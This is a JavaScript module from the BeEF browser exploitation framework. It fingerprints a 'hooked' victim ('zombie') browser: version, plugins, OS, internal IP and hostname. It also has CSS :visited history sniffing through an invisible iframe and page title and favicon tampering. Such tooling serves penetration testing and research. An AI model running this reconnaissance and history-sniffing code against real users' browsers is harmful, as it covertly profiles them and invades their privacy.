//
//   Copyright 2011 Wade Alcorn wade@bindshell.net
//
//   Licensed under the Apache License, Version 2.0 (the "License");
//   you may not use this file except in compliance with the License.
//   You may obtain a copy of the License at
//
//       http://www.apache.org/licenses/LICENSE-2.0
//
//   Unless required by applicable law or agreed to in writing, software
//   distributed under the License is distributed on an "AS IS" BASIS,
//   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
//   See the License for the specific language governing permissions and
//   limitations under the License.
//
/**
 * @literal object: beef.browser
 *
 * Basic browser functions.
 */
beef.browser = {
	
	/**
	 * Returns the user agent that the browser is claiming to be.
	 * @example: beef.browser.getBrowserReportedName()
	 */
	getBrowserReportedName: function() {						
		return navigator.userAgent;
	},
	
	/**
	 * Returns true if IE6.
	 * @example: beef.browser.isIE6()
	 */
	isIE6: function() {						
		return !window.XMLHttpRequest && !window.globalStorage;
	},
	
	/**
	 * Returns true if IE7.
	 * @example: beef.browser.isIE7()
	 */
	isIE7: function() {						
		return !!window.XMLHttpRequest && !window.chrome && !window.opera && !window.getComputedStyle && !window.globalStorage;
	},
	
	/**
	 * Returns true if IE8.
	 * @example: beef.browser.isIE8()
	 */
	isIE8: function() {						
		$j("body").append('<!--[if IE 8]>     <div id="beefiecheck" class="ie ie8"></div>      <![endif]-->');
		return ($j('#beefiecheck').hasClass('ie8'))?true:false;
	},
	
	/**
	 * Returns true if IE9.
	 * @example: beef.browser.isIE9()
	 */
	isIE9: function() {
		$j("body").append('<!--[if IE 9]>     <div id="beefiecheck" class="ie ie9"></div>      <![endif]-->');
		return ($j('#beefiecheck').hasClass('ie9'))?true:false;
	},
	
	/**
	 * Returns true if IE.
	 * @example: beef.browser.isIE()
	 */
	isIE: function() {
		return this.isIE6() || this.isIE7() || this.isIE8() || this.isIE9();
	},
	
	/**
	 * Returns true if FF2.
	 * @example: beef.browser.isFF2()
	 */
	isFF2: function() {
		return !!window.globalStorage && !window.postMessage;
	},
	
	/**
	 * Returns true if FF3.
	 * @example: beef.browser.isFF3()
	 */
	isFF3: function() {
		return !!window.globalStorage && !!window.postMessage && !JSON.parse;
	},
	
	/**
	 * Returns true if FF35.
	 * @example: beef.browser.isFF35()
	 */
	isFF35: function() {
		return !!window.globalStorage && !!JSON.parse && !window.FileReader;
	},
	
	/**
	 * Returns true if FF36.
	 * @example: beef.browser.isFF36()
	 */
	isFF36: function() {
		return !!window.globalStorage && !!window.FileReader && !window.multitouchData && !window.history.replaceState;
	},

	/**
	 * Returns true if FF4.
	 * @example: beef.browser.isFF4()
	 */
	isFF4: function() {
		return !!window.globalStorage && !!window.history.replaceState && ((parseInt(window.navigator.userAgent.match(/Firefox\/(\d+)\./)[1], 11)==4)?true:false);
	},
	
	/**
	 * Returns true if FF5.
	 * @example: beef.browser.isFF5()
	 */
	isFF5: function() {
		return !!window.globalStorage && !!window.history.replaceState && ((parseInt(window.navigator.userAgent.match(/Firefox\/(\d+)\./)[1], 11)==5)?true:false);
	},
	
	/**
	 * Returns true if FF.
	 * @example: beef.browser.isFF()
	 */
	isFF: function() {
		return this.isFF2() || this.isFF3() || this.isFF35() || this.isFF36() || this.isFF4() || this.isFF5();
	},
	
	/**
	 * Returns true if Safari.
	 * @example: beef.browser.isS()
	 */
	isS: function() {
		return !window.globalStorage && !!window.getComputedStyle && !window.opera && !window.chrome;
	},
	
	/**
	 * Returns true if Chrome 5.
	 * @example: beef.browser.isC5()
	 */
	isC5: function() {
		return (!!window.chrome && !window.webkitPerformance) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10)==5)?true:false);
	},
		
	/**
	 * Returns true if Chrome 6.
	 * @example: beef.browser.isC6()
	 */
	isC6: function() {
		return (!!window.chrome && !!window.webkitPerformance) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10)==6)?true:false);
	},

	/**
	 * Returns true if Chrome 7.
	 * @example: beef.browser.isC7()
	 */
	isC7: function() {
		return (!!window.chrome && !!window.webkitPerformance) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10)==7)?true:false);
	},

	/**
	 * Returns true if Chrome 8.
	 * @example: beef.browser.isC8()
	 */
	isC8: function() {
		return (!!window.chrome && !!window.webkitPerformance) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10)==8)?true:false);
	},
	
	/**
	 * Returns true if Chrome 9.
	 * @example: beef.browser.isC9()
	 */
	isC9: function() {
		return (!!window.chrome && !!window.webkitPerformance) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10)==9)?true:false);
	},
	
	/**
	 * Returns true if Chrome 10.
	 * @example: beef.browser.isC10()
	 */
	isC10: function() {
		return (!!window.chrome && !window.webkitPerformance) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10)==10)?true:false);
	},

	/**
	 * Returns true if Chrome 11.
	 * @example: beef.browser.isC11()
	 */
	isC11: function() {
		return (!!window.chrome && !window.webkitPerformance) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10)==11)?true:false);
	},
	
	/**
	 * Returns true if Chrome 12.
	 * @example: beef.browser.isC12()
	 */
	isC12: function() {
		return (!!window.chrome && !window.webkitPerformance) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10)==12)?true:false);
	},
	
	/**
	 * Returns true if Chrome.
	 * @example: beef.browser.isC()
	 */
	isC: function() {
		return this.isC5() || this.isC6() || this.isC7() || this.isC8() || this.isC9() || this.isC10() || this.isC11() || this.isC12();
	},

    /**
        * Returns true if Opera 9.50 trough 9.52.
        * @example: beef.browser.isO952()
        */
       isO952: function() {
           return (!!window.opera  && (window.navigator.userAgent.match(/Opera\/9\.5/) != null));
       },

       /**
        * Returns true if Opera 9.60 trough 9.64.
        * @example: beef.browser.isO960()
        */
       isO960: function() {
           return (!!window.opera  && (window.navigator.userAgent.match(/Opera\/9\.6/) != null));
       },

       /**
        * Returns true if Opera 10.xx.
        * @example: beef.browser.isO10()
        */
       isO10: function() {
           return (!!window.opera  && (window.navigator.userAgent.match(/Opera\/9\.80.*Version\/10\./) != null));
       },

       /**
        * Returns true if Opera 11.xx.
        * @example: beef.browser.isO11()
        */
       isO11: function() {
           return (!!window.opera && (window.navigator.userAgent.match(/Opera\/9\.80.*Version\/11\./) != null));
       },

	/**
	 * Returns true if Opera.
	 * @example: beef.browser.isO()
	 */
	isO: function() {
		return this.isO952() || this.isO960() || this.isO10() || this.isO11();
	},
		
	/**
	 * Returns the type of browser being used.
	 * @example: beef.browser.type().IE6
	 * @example: beef.browser.type().FF
	 * @example: beef.browser.type().O
	 */
	type: function() {
		
		return {
			C5:		this.isC5(), 	// Chrome 5
			C6:		this.isC6(), 	// Chrome 6
			C7:		this.isC7(), 	// Chrome 7
			C8:		this.isC8(), 	// Chrome 8
			C9:		this.isC9(), 	// Chrome 9
			C10:	this.isC10(), 	// Chrome 10
			C11:	this.isC11(), 	// Chrome 11
			C12:	this.isC12(), 	// Chrome 12
			C:		this.isC(), 	// Chrome any version
			FF2:	this.isFF2(),	// Firefox 2
			FF3:	this.isFF3(),	// Firefox 3
			FF35:	this.isFF35(),	// Firefox 3.5
			FF36:	this.isFF36(),	// Firefox 3.6
			FF4:	this.isFF4(),   // Firefox 4
			FF5:	this.isFF5(),	// Firefox 5
			FF:		this.isFF(),	// Firefox any version
			IE6:	this.isIE6(),	// Internet Explorer 6
			IE9:	this.isIE9(),	// Internet Explorer 9
			IE8:	this.isIE8(),	// Internet Explorer 8
			IE7:	this.isIE7(),	// Internet Explorer 7
			IE:		this.isIE(),	// Internet Explorer any version
            O952:   this.isO952(),  // Opera 9.50 trough 9.52
            O960:   this.isO960(),  // Opera 9.60 trough 9.64
            O10:    this.isO10(),  	// Opera 10.xx
            O11:    this.isO11(),  	// Opera 11.xx
			O:      this.isO(), 	// Opera any version
			S:		this.isS()		// Safari any version
		}
	},
	 
	/**
	 * Returns the type of browser being used.
	 * @return: {String} User agent software and version.
	 *
	 * @example: beef.browser.getBrowserVersion()
	 */
	getBrowserVersion: function() {
				
		if (this.isC5())	{ return '5'  }; 	// Chrome 5
		if (this.isC6())	{ return '6'  }; 	// Chrome 6
		if (this.isC7())	{ return '7'  }; 	// Chrome 7
		if (this.isC8())	{ return '8'  }; 	// Chrome 8
		if (this.isC9())	{ return '9'  }; 	// Chrome 9
		if (this.isC10())	{ return '10' }; 	// Chrome 10
		if (this.isC11())   { return '11' }; 	// Chrome 11
		if (this.isC12())   { return '12' }; 	// Chrome 12
		if (this.isFF2())	{ return '2'  };	// Firefox 2
		if (this.isFF3())	{ return '3'  };	// Firefox 3
		if (this.isFF35())	{ return '3.5'};	// Firefox 3.5
		if (this.isFF36())	{ return '3.6'};	// Firefox 3.6
		if (this.isFF4())	{ return '4'  };	// Firefox 4
		if (this.isFF5())	{ return '5'  };	// Firefox 5
		if (this.isIE6())	{ return '6'  };	// Internet Explorer 6
		if (this.isIE9())	{ return '9'  };	// Internet Explorer 9
		if (this.isIE8())	{ return '8'  };	// Internet Explorer 8
		if (this.isIE7())	{ return '7'  };	// Internet Explorer 7
        if (this.isO952())	{ return '9.5'};	// Opera 9.5x
        if (this.isO960())	{ return '9.6'};	// Opera 9.6
        if (this.isO10())	{ return '10' };	// Opera 10.xx
        if (this.isO11())	{ return '11' };	// Opera 11.xx
		return 'UNKNOWN';						// Unknown UA
	},
	
	/**
	 * Returns the type of user agent by hooked browser.
	 * @return: {String} User agent software.
	 *
	 * @example: beef.browser.getBrowserName()
	 */
	getBrowserName: function() {
				
		if (this.isC())		{ return 'C' }; 	// Chrome any version
		if (this.isFF())	{ return 'FF'};		// Firefox any version
		if (this.isIE())	{ return 'IE'};		// Internet Explorer any version
		if (this.isO())		{ return 'O' };		// Opera any version
		if (this.isS())		{ return 'S' };		// Safari any version
		return 'UN';							// Unknown UA
	},
	
	/**
	 * Checks if the zombie has flash installed and enabled.
	 * @return: {Boolean} true or false.
	 *
	 * @example: if(beef.browser.hasFlash()) { ... }
	 */
	hasFlash: function() {
		if (!this.type().IE) {
			return (navigator.mimeTypes && navigator.mimeTypes["application/x-shockwave-flash"]); 
		} else {
			flash_versions = 10;
			flash_installed = false;

			if (window.ActiveXObject) {
				for (x = 2; x <= flash_versions; x++) {
					try {
						Flash = eval("new ActiveXObject('ShockwaveFlash.ShockwaveFlash." + x + "');");
						if (Flash) {
							flash_installed = true;
						}
					}
					catch(e) { }
				}
			};
			return flash_installed;
		}
	},
	
	/**
	 * Checks if the zombie has Java installed and enabled.
	 * @return: {Boolean} true or false.
	 *
	 * @example: if(beef.browser.hasJava()) { ... }
	 */
	hasJava: function() {
		if(!this.type().IE && window.navigator.javaEnabled && window.navigator.javaEnabled()) {
			return true;
		}
		return false;
	},
	
	/**
	 * Checks if the zombie has VBScript enabled.
	 * @return: {Boolean} true or false.
	 *
	 * @example: if(beef.browser.hasVBScript()) { ... }
	 */
	hasVBScript: function() {
		if ((navigator.userAgent.indexOf('MSIE') != -1) && (navigator.userAgent.indexOf('Win') != -1)) {
			return true;
		} else {
			return false;
		}
	},
	
	/**
	 * Returns the list of plugins installed in the browser.
	 */
	getPlugins: function() {
		var results = '';
        if (this.isIE())
        {
            results = this.getPluginsIE();
        } else {
            if (navigator.plugins && navigator.plugins.length > 0)
            {
                var length = navigator.plugins.length;
                for (var i=0; i < length; i++)
                {
                    if (i != 0)
                        results += ', ';
                    results += navigator.plugins[i].name;
                }
            } else {
                results = 'navigator.plugins is not supported in this browser!';
            }
        }
		return results;
	},
	
	/**
	 * Returns a list of plugins detected by IE. This is a hack because IE doesn't
	 * support navigator.plugins 
	 */
     getPluginsIE: function() {
        var results = '';
        var plugins = {'AdobePDF6':{
            'control':'PDF.PdfCtrl', 
            'return': function(control) {
                version = control.getVersions().split(',');
                version = version[0].split('=');
                return 'Acrobat Reader v'+parseFloat(version[1]);
            }}, 
            'AdobePDF7':{
            'control':'AcroPDF.PDF',
            'return': function(control) {
                version = control.getVersions().split(',');
                version = version[0].split('=');
                return 'Acrobat Reader v'+parseFloat(version[1]);
            }},
            'Flash':{
            'control':'ShockwaveFlash.ShockwaveFlash',
            'return': function(control) {
                version = control.getVariable('$version').substring(4);
                version = version.split(',');
                return 'Flash Player v'+parseFloat(version[0]+'.'+version[1]);
            }},
            'Quicktime':{
            'control': 'QuickTime.QuickTime',
            'return': function(control) {
                return 'QuickTime Player';
            }},
            'RealPlayer':{
            'control': 'RealPlayer',
            'return': function(control) {
                version = control.getVersionInfo();
                return 'RealPlayer v'+parseFloat(version);
            }},
            'Shockwave':{
            'control': 'SWCtl.SWCtl',
            'return': function(control) {
                version = control.ShockwaveVersion('').split('r');
                return 'Shockwave v'+parseFloat(version[0]);
            }},
            'WindowsMediaPlayer': {
            'control': 'WMPlayer.OCX',
            'return': function(control) {
                return 'Windows Media Player v'+parseFloat(control.versionInfo);
            }}
            };
        if (window.ActiveXObject) {
            var j = 0;
            for (var i in plugins)
            {
                var control = null;
                var version = null;
                try {
                    control = new ActiveXObject(plugins[i]['control']);
                } catch (e) { }
                if (control)
                {
                    if (j != 0)
                        results += ', ';
                    results += plugins[i]['return'](control);
                    j++;
                }
            }
        }
        return results;
    },

	/**
	 * Returns zombie screen size and color depth.
	 */	
	getScreenParams: function() {
		return {
			width: window.screen.width, 
			height: window.screen.height,
			colordepth: window.screen.colorDepth
			}
	},

	/**
	 * Returns zombie browser window size.
	 * @from: http://www.howtocreate.co.uk/tutorials/javascript/browserwindow
	 */	
	getWindowSize: function() {
		  var myWidth = 0, myHeight = 0;
		  if( typeof( window.innerWidth ) == 'number' ) {
		    // Non-IE
		    myWidth = window.innerWidth;
		    myHeight = window.innerHeight;
		  } else if( document.documentElement && ( document.documentElement.clientWidth || document.documentElement.clientHeight ) ) {
		    // IE 6+ in 'standards compliant mode'
		    myWidth = document.documentElement.clientWidth;
		    myHeight = document.documentElement.clientHeight;
		  } else if( document.body && ( document.body.clientWidth || document.body.clientHeight ) ) {
		    // IE 4 compatible
		    myWidth = document.body.clientWidth;
		    myHeight = document.body.clientHeight;
		  }
		  return {
			  width: myWidth,
			  height: myHeight
		  }
	},
	
	/**
	 * Construct hash from browser details. This function is used to grab the browser details during the hooking process
	 */	
	getDetails: function() {
		var details = new Array();
		
		var browser_name = beef.browser.getBrowserName();
		var browser_version = beef.browser.getBrowserVersion();
		var browser_reported_name = beef.browser.getBrowserReportedName();
		var page_title = document.title;
		var hostname = document.location.hostname;
		var browser_plugins = beef.browser.getPlugins();
		var os_name = beef.os.getName();
		var internal_ip = beef.net.local.getLocalAddress();
		var internal_hostname = beef.net.local.getLocalHostname();
		
		if(browser_name) details["BrowserName"] = browser_name;
		if(browser_version) details["BrowserVersion"] = browser_version;
		if(browser_reported_name) details["BrowserReportedName"] = browser_reported_name;
		if(page_title) details["PageTitle"] = page_title;
		if(hostname) details["HostName"] = hostname;
		if(browser_plugins) details["BrowserPlugins"] = browser_plugins;
		if(os_name) details['OsName'] = os_name;
		if(internal_ip) details['InternalIP'] = internal_ip;
		if(internal_hostname) details['InternalHostname'] = internal_hostname;
		
		return details;
	},
	
	/**
	 * Returns array of results, whether or not the target zombie has visited the specified URL
	 */
	hasVisited: function(urls) {
		var results = new Array();
		var iframe = beef.dom.createInvisibleIframe();
		var ifdoc = (iframe.contentDocument) ? iframe.contentDocument : iframe.contentWindow.document;
		ifdoc.open();
		ifdoc.write('<style>a:visited{width:0px !important;}</style>');
		ifdoc.close();
		urls = urls.split("\n");
		var count = 0;
		for (var i in urls)
		{
			var u = urls[i];
			if (u != "" || u != null)
			{
				var success = false;
				var a = ifdoc.createElement('a');
				a.href = u;
				ifdoc.body.appendChild(a);
				var width = null;
				(a.currentStyle) ? width = a.currentStyle['width'] : width = ifdoc.defaultView.getComputedStyle(a, null).getPropertyValue("width"); 
				if (width == '0px') {
					success = true;
				}
				results.push({'url':u, 'visited':success});
				count++;
			}
		}
		beef.dom.removeElement(iframe);
		if (results.length == 0) 
		{
			return false;
		}
		return results;
	},
	
	/**
	 * Checks if the zombie has Google Gears installed.
	 * @return: {Boolean} true or false.
	 *
	 * @from: https://code.google.com/apis/gears/gears_init.js
	 * */
	hasGoogleGears: function() {

		if (window.google && google.gears) {
			return true;
		}

		var ggfactory = null;

		// Firefox
		if (typeof GearsFactory != 'undefined') {
			ggfactory = new GearsFactory();
		} else {
			// IE
			try {
				ggfactory = new ActiveXObject('Gears.Factory');
				// IE Mobile on WinCE.
				if (ggfactory.getBuildInfo().indexOf('ie_mobile') != -1) {
					ggfactory.privateSetGlobalObject(this);
				}
			} catch (e) {
				// Safari
				if ((typeof navigator.mimeTypes != 'undefined')
						&& navigator.mimeTypes["application/x-googlegears"]) {
					ggfactory = document.createElement("object");
					ggfactory.style.display = "none";
					ggfactory.width = 0;
					ggfactory.height = 0;
					ggfactory.type = "application/x-googlegears";
					document.documentElement.appendChild(ggfactory);
					if(ggfactory && (typeof ggfactory.create == 'undefined')) {
						ggfactory = null;
					}
				}
			}
		}
		if (!ggfactory) {
			return false
		} else {
			return true
		}
	},

	/**
	 * Dynamically changes the favicon: works in Firefox, Chrome and Opera
	 **/
	changeFavicon: function(favicon_url) {
        var iframe = null;
        if (this.isC()) {
            iframe = document.createElement('iframe');
            iframe.src = 'about:blank';
            iframe.style.display = 'none';
            document.body.appendChild(iframe);
        }
        var link = document.createElement('link'),
        oldLink = document.getElementById('dynamic-favicon');
        link.id = 'dynamic-favicon';
        link.rel = 'shortcut icon';
        link.href = favicon_url;
        if (oldLink) {
          document.head.removeChild(oldLink);
        }
        document.head.appendChild(link);
        if (this.isC()) {
          iframe.src += '';
        }
	},
	
	/**
	 * Changes page title
	 **/
	changePageTitle: function(title) {
		document.title = title;
	},


	/**
	 *  A function that gets the max number of simaltaneous connections the browser can make
	 *  per domain, or globally on all domains.
     *
     *  This code is based on research from browserspy.dk
     *
	 * @parameter {ENUM: 'PER_DOMAIN', 'GLOBAL'=>default}
	 * @return {Deferred promise} A jQuery deferred object promise, which when resolved passes
	 *	the number of connections to the callback function as "this"
	 *
	 *	example usage:
	 *		$j.when(getMaxConnections()).done(function(){
	 *			console.debug("Max Connections: " + this);
	 *			});
	 *
	 */
	getMaxConnections: function(scope) {

		var imagesCount = 30;		// Max number of images to test.
		var secondsTimeout = 5;		// Image load timeout threashold.
		var testUrl ="";			// The image testing service URL.

		// User broserspy.dk max connections service URL.
		if(scope=='PER_DOMAIN')
			 testUrl = "http://browserspy.dk/connections.php?img=1&amp;random=";
		else
			// The token will be replaced by a different number with each request(different domain).
			testUrl = "http://<token>.browserspy.dk/connections.php?img=1&amp;random=";


		var imagesLoaded = 0;				// Number of responding images before timeout.
		var imagesRequested = 0;			// Number of requested images.
		var testImages = new Array();		// Array of all images.
		var deferredObject = $j.Deferred();	// A jquery Deferred object.

		for (var i = 1; i <= imagesCount; i++)
		{
			// Asynchronously request image.
			testImages[i] =
				$j.ajax({
					type: "get",
					dataType: true,
					url: (testUrl.replace("<token>",i)) + Math.random(),
					data: "",
					timeout: (secondsTimeout * 1000),

					// Function on completion of request.
					complete: function(jqXHR, textStatus){

						imagesRequested++;

						// If the image returns a 200 or a 302, the text Status is "error", else null
						if(textStatus == "error")
						{
							imagesLoaded++;
						}

						// If all images requested
						if(imagesRequested >= imagesCount)
						{
							// resolve the deferred object passing the number of loaded images.
							deferredObject.resolveWith(imagesLoaded);
						}
					 }
				});

		}

		// Return a promise to resolve the deffered object when the images are loaded.
		return deferredObject.promise();

	}
	
};

beef.regCmp('beef.browser');